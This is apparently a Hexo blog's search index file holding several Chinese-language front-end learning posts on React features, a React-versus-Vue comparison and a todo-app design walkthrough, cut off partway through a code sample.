<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【博客分享】新的一年前端应该怎么学</title>
      <link href="/2019/02/06/bo-ke-fen-xiang-xin-de-yi-nian-qian-duan-ying-gai-zen-me-xue/"/>
      <url>/2019/02/06/bo-ke-fen-xiang-xin-de-yi-nian-qian-duan-ying-gai-zen-me-xue/</url>
      
        <content type="html"><![CDATA[<blockquote><p>总结过去，展望未来</p></blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzUxMzcxMzE5Ng==&amp;mid=2247490221&amp;idx=1&amp;sn=d368c46ed4dbd44ef2621fd5172fd4b1&amp;chksm=f951afeece2626f80287b9aac8a1120cf9c27f17dc0e3922128a87430787315b3b65a1ee7a71&amp;token=652753404&amp;lang=zh_CN#rd" target="_blank" rel="noopener">前端2018解读：吃瓜又一年</a><br><img src="/img/in-post/web-02.JPG" alt="keywords"></p><p><a href="/project/HackerRank_2019-2018_Developer-Skills-Report.pdf">来自HackerRank的数据报告</a></p><ul><li>JavaScript: 2018’s most popular language</li><li>Languages developers want to learn in 2019: GO, Python, TypeScript</li><li>React poised to overtake AngularJS in 2019</li></ul><p><a href="https://2018.stateofjs.com/front-end-frameworks/overview/" target="_blank" rel="noopener">另一份数据-2018前端框架回顾</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzUxMzcxMzE5Ng==&amp;mid=2247490212&amp;idx=1&amp;sn=b9d8f51551baaeb9cdb3c7ebb02ccc9b&amp;chksm=f951afe7ce2626f1926f2999e64a019f9ac7058642a83d2650eaf4b096cd8600a66a91cc85d5&amp;token=652753404&amp;lang=zh_CN#rd" target="_blank" rel="noopener">Top libraries tech to learn in 2019 for full-stack developers</a>文章概览了最近几年前端的流行技术，提出了我们在新的一年应该继续关注的技术细节<br><img src="/img/in-post/web-01.JPG" alt="keywords"></p><p>前端学不下了？越来越多框架的流行，前端技术层出不穷。作为想提高自身技术的前端er，前阵子也入手了Winter老师的重学前端，打好基础是关键啊。Winter老师提出了几个值得关注的技术：图形学、包管理、AI 领域和前端的结合and三大框架</p>]]></content>
      
      
      <categories>
          
          <category> 想法分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>React学习（三）更多特性</title>
      <link href="/2018/12/24/react-xue-xi-san-geng-duo-te-xing/"/>
      <url>/2018/12/24/react-xue-xi-san-geng-duo-te-xing/</url>
      
        <content type="html"><![CDATA[<h4 id="props-children使代码更加优雅"><a href="#props-children使代码更加优雅" class="headerlink" title="props.children使代码更加优雅"></a>props.children使代码更加优雅</h4><ul><li>当需要编写一个容器类组件，我们需要把内容传入容器，一个通用写法是<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Container</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span><span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>      <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"content"</span><span class="token operator">></span>        <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>content<span class="token punctuation">}</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Card</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>  <span class="token operator">&lt;</span>Container content<span class="token operator">=</span><span class="token punctuation">{</span>      <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token keyword">this</span> is the content      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>Container<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>使用props.children相当于一个占位符，更改后的写法变为<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Container</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span><span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>      <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"content"</span><span class="token operator">></span>        <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>children<span class="token punctuation">}</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Card</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>Container<span class="token operator">></span>      <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token keyword">this</span> is the content<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>Container<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="PropTypes-类型检查"><a href="#PropTypes-类型检查" class="headerlink" title="PropTypes 类型检查"></a>PropTypes 类型检查</h4><ul><li>PropTypes 包含一整套验证器，可用于确保你接收的数据是有效的。在开发模式下，当你给属性传递了无效值时，控制台将会打印警告</li><li>类型<ul><li>JS原生类型：<code>array, bool, func, number, object, string, symbol</code></li><li>任何可被渲染的元素（包括数字、字符串、子元素或数组）：<code>node</code></li><li>一个 React 元素：<code>element</code></li><li>某个类的实例：<code>instanceOf(SomeClass)`</code></li><li>限制你的属性值是某个特定值之一：<code>oneOf([Array of Value])`</code></li><li>限制它为列举类型之一的对象：<code>oneOfType([Array of PropsTypes])</code></li><li>一个指定元素类型的数组：<code>arrayOf(PropTypes)</code></li><li>一个指定类型的对象：<code>objectOf(PropTypes)</code></li><li>一个指定属性及其类型的对象：<code>shape(Object)</code></li></ul></li><li>限制：<ul><li>可以在任何 PropTypes 属性后面加上 <code>isRequired</code> 后缀</li><li>指定一个自定义验证器。它应该在验证失败时返回一个 Error 对象<pre class=" language-javascript"><code class="language-javascript">customProp<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>props<span class="token punctuation">,</span> propName<span class="token punctuation">,</span> componentName<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/matchme/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>props<span class="token punctuation">[</span>propName<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>    'Invalid prop <span class="token template-string"><span class="token string">`' + propName + '`</span></span> supplied to' <span class="token operator">+</span>    ' <span class="token template-string"><span class="token string">`' + componentName + '`</span></span><span class="token punctuation">.</span> Validation failed<span class="token punctuation">.</span>'  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li><li>示例<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">import</span> PropTypes <span class="token keyword">from</span> <span class="token string">'prop-types'</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span><span class="token keyword">static</span> propTypes <span class="token operator">=</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> PropTypes<span class="token punctuation">.</span>string<span class="token punctuation">}</span>render <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//...</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//or</span>Test<span class="token punctuation">.</span>propTypes <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token punctuation">:</span> PropTypes<span class="token punctuation">.</span>string<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li><li>其他静态类型检查工具：TypeScript, Flow, Reason, Kotlin等</li></ul><h4 id="defaultProps-为-props定义默认值"><a href="#defaultProps-为-props定义默认值" class="headerlink" title="defaultProps 为 props定义默认值"></a>defaultProps 为 props定义默认值</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 为属性指定默认值:</span>Test<span class="token punctuation">.</span>defaultProps <span class="token operator">=</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'Stranger'</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="Refs-amp-DOM"><a href="#Refs-amp-DOM" class="headerlink" title="Refs &amp; DOM"></a>Refs &amp; DOM</h4><ul><li>Refs 提供了一种方式，用于访问在 render 方法中创建的 DOM 节点或 React 元素</li><li>适合使用 refs 的情况：<ul><li>处理焦点、文本选择或媒体控制</li><li>触发强制动画</li><li>集成第三方 DOM 库</li></ul></li><li>React 会在组件加载时将 DOM 元素传入 current 属性，在卸载时则会改回 null</li><li>用法<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">MyComponent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>myRef <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token operator">&lt;</span>div ref<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>myRef<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// or 函数式组件</span><span class="token operator">&lt;</span>div ref<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span>input <span class="token operator">=</span> input<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//访问</span><span class="token keyword">const</span> node <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>myRef<span class="token punctuation">.</span>current<span class="token punctuation">;</span></code></pre></li></ul><h4 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h4><ul><li>重写<code>shouldComponentUpdate</code></li><li>继承<code>React.PureComponent</code></li><li>解决简单比较问题且不突变原始对象的方案：<code>concat</code>, es6的展开语法，Object.assign</li><li>immutable.js是解决不可突变的数据结构的另一种方案<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> SomeRecord <span class="token operator">=</span> Immutable<span class="token punctuation">.</span><span class="token function">Record</span><span class="token punctuation">(</span><span class="token punctuation">{</span> foo<span class="token punctuation">:</span> <span class="token keyword">null</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SomeRecord</span><span class="token punctuation">(</span><span class="token punctuation">{</span> foo<span class="token punctuation">:</span> <span class="token string">'bar'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> y <span class="token operator">=</span> x<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x <span class="token operator">===</span> y<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span></code></pre></li></ul><h4 id="高阶组件"><a href="#高阶组件" class="headerlink" title="高阶组件"></a>高阶组件</h4><ul><li>高阶组件（HOC）是react中的高级技术，用来重用组件逻辑。<strong>高阶组件就是一个函数，且该函数接受一个组件作为参数，并返回一个新的组件</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> react </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React与Vue有什么异同</title>
      <link href="/2018/12/24/react-yu-vue-you-shi-me-yi-tong/"/>
      <url>/2018/12/24/react-yu-vue-you-shi-me-yi-tong/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/in-post/react-vue-framework.JPG" alt="framework"></p><h4 id="相似之处"><a href="#相似之处" class="headerlink" title="相似之处"></a>相似之处</h4><p>React 和 Vue 有许多相似之处，它们都有：</p><ul><li>使用 Virtual DOM</li><li>提供了响应式 (Reactive) 和组件化 (Composable) 的视图组件。</li><li>将注意力集中保持在核心库，而将其他功能如路由和全局状态管理交给相关的库</li></ul><h4 id="状态改变与重新渲染"><a href="#状态改变与重新渲染" class="headerlink" title="状态改变与重新渲染"></a>状态改变与重新渲染</h4><ul><li>在 React 应用中，当某个组件的状态发生变化时，它会以该组件为根，重新渲染整个组件子树。我们需要通过一些手动添加手段来控制子组件的渲染过程：<ul><li>要避免不必要的子组件的重渲染，可以使用<code>PureComponent</code>或者定义<code>shouldComponentUpdate</code>,可能会需要使用不可变的数据结构来使得你的组件更容易被优化</li></ul></li><li>Vue组件的依赖是在渲染过程中自动追踪的，通过 getter/setter 以及一些函数的劫持，系统能精确知晓哪个组件确实需要被重渲染，不需要考虑渲染中的优化</li></ul><h4 id="HTML-amp-CSS"><a href="#HTML-amp-CSS" class="headerlink" title="HTML &amp; CSS"></a>HTML &amp; CSS</h4><ul><li>在 React 中，一切都是 JavaScript。不仅仅是 HTML 可以用 JSX 来表达，CSS 也可以纳入到 JavaScript 中来处理</li><li>Vue 提供了模板，同时也支持 JSX和渲染函数。对于偏视图表现的 (presentational)推荐使用模板，对于偏逻辑的 (logical)推荐使用JSX或渲染函数<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//Vue</span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>pasta<span class="token operator">-</span>item v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(item, key) in samplePasta"</span> <span class="token punctuation">:</span>item<span class="token operator">=</span><span class="token string">"item"</span> <span class="token punctuation">:</span>key<span class="token operator">=</span><span class="token string">"key"</span> @order<span class="token operator">=</span><span class="token string">"handleOrder(key)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>pasta<span class="token operator">-</span>item<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token comment" spellcheck="true">// React</span><span class="token operator">&lt;</span>ul className<span class="token operator">=</span><span class="token string">"pasta-list"</span><span class="token operator">></span>  <span class="token punctuation">{</span>      Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>pastadishes<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>key <span class="token operator">=</span><span class="token operator">></span>          <span class="token operator">&lt;</span>PastaItem index<span class="token operator">=</span><span class="token punctuation">{</span>key<span class="token punctuation">}</span> key<span class="token operator">=</span><span class="token punctuation">{</span>key<span class="token punctuation">}</span> details<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>pastadishes<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">}</span> addToOrder<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>addToOrder<span class="token punctuation">}</span> orders<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>orders<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>      <span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span></code></pre></li></ul><h4 id="状态管理VS对象属性"><a href="#状态管理VS对象属性" class="headerlink" title="状态管理VS对象属性"></a>状态管理VS对象属性</h4><ul><li>React中的状态管理是一个关键的概念，在React中state数据是不可突变的，我们需要使用<code>setState</code>来更新状态</li><li>Vue通过一个data属性来管理数据</li></ul><blockquote><p>In most cases, the built-in state management patterns provided by the frameworks themselves are insufficient for large scale apps, and a dedicated solution like Redux or Vuex must be used –Evan You</p></blockquote><h4 id="Props"><a href="#Props" class="headerlink" title="Props"></a>Props</h4><ul><li>React和Vue中都有Props的概念，用于父组件向子组件传值，是单向数据流，在具体写法上有区别。同样都是父组件需要显式定义传入的值，Vue需要显式规定props的值，React可以直接引用<ul><li>Vue父子组件传值模式可以表示为：<code>Props/Event</code></li><li>Vue父子组件传值模式可以表示为：<code>Props/Callback</code></li></ul></li></ul><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p><img src="/img/in-post/react-lifecycle.JPG" alt="react-lifecycle"></p><p><img src="/img/in-post/vue-03.png" alt="vue-lifecycle"></p><h4 id="Virtual-DOM-与-Diff"><a href="#Virtual-DOM-与-Diff" class="headerlink" title="Virtual DOM 与 Diff"></a>Virtual DOM 与 Diff</h4><p>Virtual DOM是一个映射真实DOM的JavaScript对象，更新一个元素是通过操作Virtual DOM而不是真实DOM来实现的。当有产生变化时，一个新的Virtual DOM对象会被创建并计算新旧Virtual DOM之间的差别，之后这些差别会应用在真实的DOM上<br>我们用一个简单的例子来看下，在HTML中：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>item 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>item 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre><p>一个简化JS对象写法：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">{</span>    type<span class="token punctuation">:</span> <span class="token string">'ul'</span><span class="token punctuation">,</span>    props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'class'</span><span class="token punctuation">:</span> <span class="token string">'list'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    children<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span> type<span class="token punctuation">:</span> <span class="token string">'li'</span><span class="token punctuation">,</span> props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'item 1'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span> type<span class="token punctuation">:</span> <span class="token string">'li'</span><span class="token punctuation">,</span> props<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'item 2'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><blockquote><p>Note: Using a Virtual DOM is only a good idea if you’ve got a large application making many updates to the UI. If you’re only updating elements infrequently it’s probably overkill and could very likely be slower than updating the DOM directly.</p></blockquote><p>具体地，<a href="#React的Diff原理">React的Diff原理</a></p><h4 id="原生应用"><a href="#原生应用" class="headerlink" title="原生应用"></a>原生应用</h4><ul><li>React的原生集成使用React Native</li><li>Vue使用Weex</li></ul><h4 id="全局状态管理"><a href="#全局状态管理" class="headerlink" title="全局状态管理"></a>全局状态管理</h4><p>Redux和Vuex都是基于Flux数据通信模式实现的插件，用于多视图共享状态<br><img src="/img/in-post/flux.JPG" alt="flux"></p><p><img src="/img/in-post/vuex.JPG" alt="vuex"></p><h4 id="React的Diff原理"><a href="#React的Diff原理" class="headerlink" title="React的Diff原理"></a>React的Diff原理</h4><p>React基于两点假设，实现了一个启发的O(n)算法：</p><ul><li>两个不同类型的元素将产生不同的树</li><li>开发者可以使用key属性来提示哪些子元素贯穿不同渲染是稳定的  </li></ul><p>算法：</p><ul><li>当差分两棵树时，React首先根据<strong>根元素类型的不同</strong>比较两个根元素</li><li><strong>不同类型的元素</strong>：每当根元素有不同类型，React将拆除旧树并且从零开始重新构建新树当拆除一棵树时，旧的DOM节点被销毁。组件实例经历钩子<code>componentWillUnmount()</code>、 <code>componentDidMount()</code>任何与旧树有关的状态都被丢弃</li><li><strong>相同类型的DOM元素</strong>：<ul><li>观察二者的属性(attributes)：保持相同的底层DOM节点，并仅更新变化的属性</li></ul></li><li><strong>相同类型的组件元素</strong>：当组件更新时，实例保持相同，这样状态跨渲染被维护。React通过更新底层组件实例的属性(props)来匹配新元素，并在底层实例上调用<code>componentWillReceiveProps()</code> 和 <code>componentWillUpdate()</code></li><li><strong>子代们上的递归</strong>：当递归DOM节点的子节点时，React就是迭代在同一时间点的两个子节点列表</li><li><strong>Keys</strong>：当子节点有key时，React使用key来匹配原始树的子节点和随后树的子节点</li><li>采取diff算法比较新旧节点的时候，比较只会在同层级进行, 不会跨层级比</li></ul><p><a href="https://calendar.perfplanet.com/2013/diff/" target="_blank" rel="noopener">更多地，推荐一篇文章</a><br>Vue的Diff原理和React差不多</p><hr><p>未完待续，后面可能通过代码重构，来比较两种框架的代码量和响应速度</p><h4 id="参考及翻译原文"><a href="#参考及翻译原文" class="headerlink" title="参考及翻译原文"></a>参考及翻译原文</h4><ul><li><a href="https://vuejs.org/v2/guide/comparison.html" target="_blank" rel="noopener">Comparison with Other Frameworks</a></li><li><a href="https://deliciousbrains.com/vue-vs-react-battle-javascript/" target="_blank" rel="noopener">Vue vs React: Battle of the Javascript Frameworks</a></li><li><a href="https://www.bacancytechnology.com/blog/comparison-vuejs-vs-react" target="_blank" rel="noopener">Vue.js Vs React.js: Who’s one step ahead</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 想法分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>React学习（二）用React的方式思考</title>
      <link href="/2018/12/19/react-xue-xi-er-yong-react-de-fang-shi-si-kao/"/>
      <url>/2018/12/19/react-xue-xi-er-yong-react-de-fang-shi-si-kao/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://react.docschina.org/docs/thinking-in-react.html" target="_blank" rel="noopener">React官方文档</a></li><li>《移动Web前端高效开发实战》</li></ul><h4 id="React理念"><a href="#React理念" class="headerlink" title="React理念"></a>React理念</h4><p>React 最初的目的是使用 JavaScript 创建大型的，快速响应的网络应用。React的众多优点之一是它让你在编写代码的时候同时也在思考你的应用。我们通过一个简单的备忘录应用开发来理解react是怎样创建一个应用，并展示思考的过程</p><h4 id="从模拟页面开始"><a href="#从模拟页面开始" class="headerlink" title="从模拟页面开始"></a>从模拟页面开始</h4><p><img src="/img/in-post/react-02.JPG" alt="TODOLIST"></p><ul><li>页面中的数据模型为：<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"color"</span><span class="token operator">:</span> <span class="token string">"#ffffff"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span><span class="token property">"time"</span><span class="token operator">:</span><span class="token string">"2017/2/3 11:20"</span><span class="token punctuation">,</span><span class="token property">"done"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span></code></pre></li><li>页面的功能为：<ul><li>支持添加新的备忘</li><li>可切换备忘的“待做”和“已完成”状态，可设置颜色，可删除</li><li>可根据颜色、时间对列表进行排序</li><li>可分别查看“全部”、“待做”及“已完成”状态的备忘</li><li>支持本地数据存储LocalStorage</li></ul></li></ul><h4 id="把-UI-划分出组件层级"><a href="#把-UI-划分出组件层级" class="headerlink" title="把 UI 划分出组件层级"></a>把 UI 划分出组件层级</h4><ul><li>TodoApp: 整个应用的根组件，负责存储及处理应用的数据</li><li>Header：展示组件，表示应用的头部，包含应用的标题、新建备忘的内容输入框、时间输入框、对备忘录进行排序和过滤的操作栏</li><li>TodoList：展示组件，表示应用的列表部分</li><li>Memo：展示组件，表示单个备忘事项，由一个改变状态的复选框、改变备忘颜色的颜色选择器、备忘内容、备忘时间（及删除备忘按钮）组成<br><img src="/img/in-post/react-03.JPG" alt="TodoApp"></li><li>UI划分的原则：组件的划分同样遵循单一功能原则。UI 和数据模型往往遵循着相同的信息架构，如果你的模型构建正确，你的 UI (以及你的组件结构)会被很好的映射。可以把UI划分成能准确表示你数据模型的一部分的组件就可以。</li></ul><h4 id="用-React-创建一个静态版本"><a href="#用-React-创建一个静态版本" class="headerlink" title="用 React 创建一个静态版本"></a>用 React 创建一个静态版本</h4><ul><li>可以自顶向下或者自底向上构建应用。也就是，你可以从层级最高的组件开始构建(即 TodoApp开始)或层级最低的组件开始构建(Memo)。在较为简单的例子中，通常自顶向下更容易，而在较大的项目中，自底向上会更容易并且在你构建的时候有利于编写测试</li><li>我们将交互与静态版本拆分来写，一方面，可以从一开始构建应用的大致层级结构；另一方面，交互往往涉及应用逻辑及数据流的思考</li><li>在这步的最后，你会拥有一个用于呈现数据模型的可重用组件库。这些组件只会有 render() 方法。层级最高的组件会把数据模型作为 prop 传入。如果你改变你的基础数据模型并且再次调用 ReactDOM.render()， UI 会更新。这里可以看到React的单向数据流</li></ul><h4 id="定义-UI-状态的最小-但完整-表示-确定State的位置"><a href="#定义-UI-状态的最小-但完整-表示-确定State的位置" class="headerlink" title="定义 UI 状态的最小(但完整)表示/确定State的位置"></a>定义 UI 状态的最小(但完整)表示/确定State的位置</h4><ul><li>思考确定state的原则：<ul><li>它是通过 props 从父级传来的吗？如果是，他可能不是 state</li><li>它随着时间推移不变吗？如果是，它可能不是 state</li><li>你能够根据组件中任何其他的 state 或 props 把它计算出来吗？如果是，它不是 state</li></ul></li><li>确定state位置的原则：<ul><li>确定每一个需要这个 state 来渲染的组件</li><li>找到一个公共所有者组件(一个在层级上高于所有其他需要这个 state 的组件的组件)</li><li>这个公共所有者组件或另一个层级更高的组件应该拥有这个 state</li><li>如果你没有找到可以拥有这个 state 的组件，创建一个仅用来保存状态的组件并把它加入比这个公共所有者组件层级更高的地方</li></ul></li><li>思考我们的TodoApp应用<ul><li>Header中的输入框（文本、日期、时间）是可能改变，且不由props计算得到，因此我们为Header维护一个state</li><li>TodoList中的todo数组是从根应用传入的，且展示内容随着排序或者过滤内容可能发生改变，它不是state</li><li>Memo的是数据模型的最小结构，它展示的内容同样是由props决定的，不用props</li><li>TodoApp控制整个应用的状态和数据更新，它需要一个state维护应用的保持的数据项、排序条件、过滤条件</li></ul></li></ul><h4 id="添加反向数据流"><a href="#添加反向数据流" class="headerlink" title="添加反向数据流"></a>添加反向数据流</h4><ul><li>在前面我们已经实现了单向数据流，我们需要通过底层的组件去触发根组件的状态改变以更新UI状态</li><li>Header-&gt;TodoApp：<ul><li>我们通过在添加按钮中调用回调函数，可以为添加列表项，并将数据更新到UI，并存储到本地</li><li>将排序和过滤条件通过回调函数设置，可以重新排序和过滤列表项，更新展示</li></ul></li><li>Memo-&gt;TodoList-&gt;TodoApp：<ul><li>将每个数据项中颜色，是否完成状态的改变通过回调函数重新设置，可以更新TodoApp的todos内容</li></ul></li></ul><h4 id="一个完整的例子"><a href="#一个完整的例子" class="headerlink" title="一个完整的例子"></a>一个完整的例子</h4><ul><li>TodoApp<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">TodoApp</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span><span class="token function">constructor</span><span 